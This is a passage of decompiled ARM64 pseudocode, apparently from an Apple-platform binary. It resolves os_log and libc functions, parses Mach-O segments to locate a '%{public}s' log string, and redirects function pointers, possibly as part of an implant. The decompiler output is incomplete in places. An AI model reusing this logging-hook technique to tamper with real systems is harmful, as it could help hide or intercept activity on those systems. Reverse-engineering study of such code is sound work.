  __int64 v19; // x0
  __int64 v20; // x25
  __int64 v21; // x0
  __int64 v22; // x23
  __int64 v23; // x0
  __int64 v24; // x1
  __int64 v25; // x2
  __int64 v26; // x3
  __int64 v27; // x0
  __int64 v28; // x0
  __int64 v29; // x27
  int v30; // w24
  __int64 v31; // x23
  unsigned __int64 v32; // x25
  __int64 v33; // x9
  __int64 v34; // x8
  __int64 v35; // x9
  unsigned int v36; // w24
  __int64 v37; // x27
  __int64 v40; // [xsp+0h] [xbp-D0h]
  __int64 v41; // [xsp+8h] [xbp-C8h]
  __int64 v42; // [xsp+10h] [xbp-C0h]
  __int64 v43; // [xsp+18h] [xbp-B8h]
  __int64 v44; // [xsp+20h] [xbp-B0h]
  int v45; // [xsp+2Ch] [xbp-A4h]
  __int64 v46; // [xsp+30h] [xbp-A0h]
  __int64 v47; // [xsp+38h] [xbp-98h]
  __int64 v48; // [xsp+40h] [xbp-90h]
  __int64 v49; // [xsp+48h] [xbp-88h]
  __int64 *v50; // [xsp+58h] [xbp-78h]
  char v51[8]; // [xsp+60h] [xbp-70h] BYREF
  __int64 v52; // [xsp+68h] [xbp-68h]

  if ( (unsigned int)sub_4C18(a1, "_asl_vlog") )
  {
    if ( (unsigned int)sub_4C18(a1, "_asl_log") )
      return 9502731;
    v8 = sub_6CFC;
  }
  else
  {
    v8 = (__int64 (__fastcall *)(int, int, int, int, int, int, int, int, char))sub_6C7C;
  }
  v7 = 9502731;
  v9 = sub_5C((__int64)"/usr/lib/system/libsystem_trace.dylib", 16, v5, v6);
  if ( v9 )
  {
    v12 = v9;
    sub_5C(v9, (__int64)"_os_log_actual", v10, v11);
    sub_10EC();
    if ( v16 )
    {
      sub_5C(v12, (__int64)"_os_log_internal", v14, v15);
      sub_10EC();
      if ( v17 )
      {
        v18 = v17;
        sub_5C(v12, (__int64)"_os_log_default", v14, v15);
        sub_10EC();
        if ( v19 )
        {
          v20 = v19;
          v21 = sub_5C((__int64)"/usr/lib/system/libsystem_c.dylib", 16, v14, v15);
          if ( v21 )
          {
            v22 = v21;
            sub_5C(v21, (__int64)"vasprintf", v14, v15);
            sub_10EC();
            if ( v23 )
            {
              v46 = v23;
              sub_5C(v22, (__int64)"_NSGetMachExecuteHeader", v25, v26);
              sub_10EC();
              if ( v27 )
              {
                v44 = v27;
                sub_5C(v22, (__int64)"free", v25, v26);
                sub_10EC();
                if ( v28 )
                {
                  v43 = v28;
                  if ( (unsigned int)sub_5C(v18, (__int64)v51, v25, v26) )
                  {
                    v29 = v52;
                    if ( *(_DWORD *)(v52 + 16) )
                    {
                      v40 = v20;
                      v41 = v18;
                      v42 = v22;
                      v30 = 0;
                      v31 = v52 + 32;
                      while ( *(_DWORD *)v31 != 25
                           || (unsigned int)sub_4C18((char *)(v31 + 8), "__TEXT")
                           || !*(_DWORD *)(v31 + 64) )
                      {
LABEL_19:
                        v31 += *(unsigned int *)(v31 + 4);
                        if ( (unsigned int)++v30 >= *(_DWORD *)(v29 + 16) )
                        {
                          v22 = v42;
                          goto LABEL_33;
                        }
                      }
                      v32 = 0;
                      v49 = v29 - *(_QWORD *)(v31 + 24);
                      v47 = v29;
                      v48 = v31 + 72;
                      v45 = v30;
                      while ( 1 )
                      {
                        if ( !(unsigned int)sub_4C18((char *)(v48 + 80 * v32), "__oslogstring") )
                        {
                          v33 = v48 + 80 * v32;
                          v34 = *(_QWORD *)(v33 + 40);
                          v50 = (__int64 *)(v33 + 40);
                          if ( v34 )
                            break;
                        }
LABEL_24:
                        ++v32;
                        v29 = v47;
                        v30 = v45;
                        if ( v32 >= *(unsigned int *)(v31 + 64) )
                          goto LABEL_19;
                      }
                      v35 = 0;
                      v36 = 1;
                      while ( 1 )
                      {
                        v37 = v49 + *(v50 - 1) + v35;
                        if ( !(unsigned int)sub_4CB4(v37, (__int64)"%{public}s", v34 - v35) )
                          break;
                        v35 = v36;
                        v34 = *v50;
                        if ( *v50 <= (unsigned __int64)v36++ )
                          goto LABEL_24;
                      }
                      v22 = v42;
                      if ( v47 )
                      {
                        v7 = 0;
                        qword_7530 = v41;
                        qword_7538 = v40;
                        qword_7540 = v46;
                        qword_7548 = v44;
                        qword_7550 = v43;
                        qword_7558 = v37;
                        *a3 = v8;
                      }
                    }
                  }
                }
              }
            }
LABEL_33:
            sub_5C(v22, v24, v25, v26);
          }
        }
      }
    }
    sub_5C(v12, v13, v14, v15);
  }
  return v7;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6C7C
// Address:  0x6C7C  Size: 128 bytes
// Calls:    sub_5C, sub_6D84
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6C7C(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v7; // [xsp+8h] [xbp-18h] BYREF

  v7 = 0;
  sub_5C((__int64)&v7, a4, a5, a4);
  return sub_6D84(a3, v7);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6CFC
// Address:  0x6CFC  Size: 136 bytes
// Calls:    sub_5C, sub_6D84
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6CFC(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        char a9)
{
  _QWORD v11[2]; // [xsp+0h] [xbp-20h] BYREF

  v11[0] = 0;
  v11[1] = &a9;
  sub_5C((__int64)v11, a4, (__int64)&a9, a4);
  return sub_6D84(a3, v11[0]);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6D84
// Address:  0x6D84  Size: 240 bytes
// Calls:    sub_4B68, sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_6D84()
{
  return 0xFFFFFFFFLL;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6E74
// Address:  0x6E74  Size: 156 bytes
// Calls:    sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6E74(_QWORD *a1)
{
  int v1; // w8
  __int64 v2; // x10

  v1 = *(_DWORD *)(*a1 + 16LL);
  if ( !v1 )
    return 0;
  v2 = a1[13] + 32LL;
  while ( *(_DWORD *)v2 != 25 || (*(_BYTE *)(v2 + 60) & 2) == 0 )
  {
    v2 += *(unsigned int *)(v2 + 4);
    if ( !--v1 )
      return 0;
  }
  return *(_QWORD *)(v2 + 24) + a1[11] - a1[10];
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6F10
// Address:  0x6F10  Size: 280 bytes
// Calls:    sub_5E10, sub_68DC, sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6F10(
        __int64 a1,
        unsigned int *a2,
        __int64 (__fastcall **a3)(int, int, int, int, int, int, int, int, char),
        __int64 a4,
        __int64 a5)
{
  char v7; // w9
  int v8; // w10
  __int16 v9; // w9
  __int64 v10; // x9
  char *v11; // x21
  unsigned __int64 v12; // x9
  __int64 result; // x0
  __int64 (__fastcall *v15)(int, int, int, int, int, int, int, int, char); // x8
  __int64 (__fastcall *v16)(int, int, int, int, int, int, int, int, char); // x8
  int v17; // w8
  __int64 (__fastcall *v18)(int, int, int, int, int, int, int, int, char); // [xsp+8h] [xbp-28h] BYREF

  v18 = 0;
  v7 = *((_BYTE *)a2 + 4);
  if ( (~v7 & 0xE) == 0 )
  {
    v8 = v7 & 0x10;
    v9 = *((_WORD *)a2 + 3);
    if ( v8 | v9 & 0x80 )
    {
      v15 = (__int64 (__fastcall *)(int, int, int, int, int, int, int, int, char))(*((_QWORD *)a2 + 1)
                                                                                 + *(_QWORD *)(a1 + 96));
      *a3 = v15;
      if ( (v9 & 8) != 0 )
      {
        v16 = (__int64 (__fastcall *)(int, int, int, int, int, int, int, int, char))((unsigned __int64)v15 | 1);
LABEL_14:
        *a3 = v16;
      }
      return 1;
    }
  }
  v10 = *(_QWORD *)(a1 + 72);
  if ( !v10 )
    return 0;
  v11 = (char *)(v10 + *a2);
  v12 = *(_QWORD *)(a1 + 88);
  if ( (unsigned __int64)v11 < v12 || v12 + *(unsigned int *)(a1 + 168) <= (unsigned __int64)v11 )
    return 0;
  v17 = sub_5E10(v11, a4, a5, (__int64 *)&v18, 0);
  result = 0;
  if ( !v17 )
  {
    *a3 = v18;
    if ( !(unsigned int)sub_68DC(v11, a5, &v18) )
    {
      v16 = v18;
      goto LABEL_14;
    }
    return 1;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7028
// Address:  0x7028  Size: 216 bytes
// Calls:    sub_5C, sub_10EC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7028(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // x21
  __int64 v7; // x0
  __int64 v8; // x2
  __int64 v9; // x3
  __int64 v10; // x22
  __int64 v11; // x0
  __int64 v12; // x1
  __int64 v13; // x2
  __int64 v14; // x3

  v4 = 708609;
  if ( a1 && a2 && a3 && a4 )
  {
    v7 = sub_5C(a2, 1, a3, (__int64)a4);
    if ( v7 )
    {
      v10 = v7;
      sub_5C(v7, a3, v8, v9);
      sub_10EC();
      if ( v11 )
      {
        v4 = 0;
        *a4 = v11;
      }
      else
      {
        v4 = 73729;
      }
      sub_5C(v10, v12, v13, v14);
    }
    else
    {
      return 73739;
    }
  }
  return v4;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7100
// Address:  0x7100  Size: 288 bytes
// Calls:    sub_4994, sub_134, sub_F8, sub_10EC, sub_BC, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7100(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // x19
  __int64 v4; // x22
  __int64 v5; // x21
  __int64 v6; // x0
  int v7; // w8
  __int64 v8; // x22
  __int64 v9; // x0
  __int64 v10; // x8
  __int64 v11; // x1
  __int64 v12; // x0

  v3 = *(_QWORD *)(a3 + 48);
  v4 = *(_QWORD *)(v3 + 32);
  if ( v4 == 4921 )
  {
LABEL_4:
    v5 = *(_QWORD *)(v3 + 40);
    if ( !v5 )
      return;
    sub_4994(*(_QWORD *)(v3 + 40), *(_QWORD *)(a3 + 48), 0x330u);
    *(_QWORD *)(v3 + 32) = 4920;
    sub_134();
    *(_QWORD *)(v3 + 264) = v6;
    v7 = *(_DWORD *)(v3 + 16);
    *(_DWORD *)(v5 + 16380) = v7;
    *(_DWORD *)(v5 + 16364) = v7;
    if ( v4 == 4921 )
    {
      v8 = *(_QWORD *)(v5 + 824);
      sub_F8();
      *(_QWORD *)(v5 + 16424) = v9;
      v10 = *(_QWORD *)(v3 + 24) + v8;
    }
    else
    {
      v10 = *(_QWORD *)(v3 + 24);
    }
    *(_QWORD *)(v3 + 168) = v10;
    goto LABEL_11;
  }
  if ( v4 != 4920 )
  {
    if ( v4 != 4919 )
      return;
    goto LABEL_4;
  }
  v11 = *(_QWORD *)(v3 + 40);
  if ( !v11 )
    return;
  sub_4994(*(_QWORD *)(a3 + 48), v11, 0x330u);
  sub_10EC();
LABEL_11:
  sub_BC();
  *(_QWORD *)(v3 + 272) = v12;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7220
// Address:  0x7220  Size: 368 bytes
// Calls:    sub_4C18, sub_5C
// Xrefs:    4 callers
// Strings:  "__TEXT"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7220(char *a1, char *a2, __int64 a3, _QWORD *a4, _QWORD *a5)
{
  __int64 v5; // x19
  char *v9; // x21
  __int64 v10; // x27
  unsigned int v11; // w28
  __int64 v12; // x20
  unsigned __int64 v13; // x19
  char *v14; // x26
  __int64 v15; // x10

  v5 = 98310;
  if ( *(_DWORD *)(a3 + 16) )
  {
    v9 = 0;
    v10 = 0;
    v11 = 0;
    v12 = a3 + 32;
    do
    {
      if ( v10 && v9 )
        break;
      if ( *(_DWORD *)v12 == 25 )
      {
        if ( !(unsigned int)sub_4C18((char *)(v12 + 8), "__TEXT") )
          v10 = v12;
        if ( !v9 )
        {
          if ( (unsigned int)sub_4C18((char *)(v12 + 8), a1) || !*(_DWORD *)(v12 + 64) )
          {
            v9 = 0;
          }
          else
          {
            v13 = 0;
            v9 = 0;
            v14 = (char *)(v12 + 72);
            do
            {
              if ( !(unsigned int)sub_4C18(v14, a2) )
                v9 = v14;
              ++v13;
              v14 += 80;
            }
            while ( v13 < *(unsigned int *)(v12 + 64) );
            v5 = 98310;
          }
        }
      }
      v12 += *(unsigned int *)(v12 + 4);
      ++v11;
    }
    while ( v11 < *(_DWORD *)(a3 + 16) );
    if ( v10 && v9 )
    {
      v5 = 0;
      v15 = *((_QWORD *)v9 + 5);
      *a4 = a3 - *(_QWORD *)(v10 + 24) + *((_QWORD *)v9 + 4);
      *a5 = v15;
    }
  }
  return v5;
}

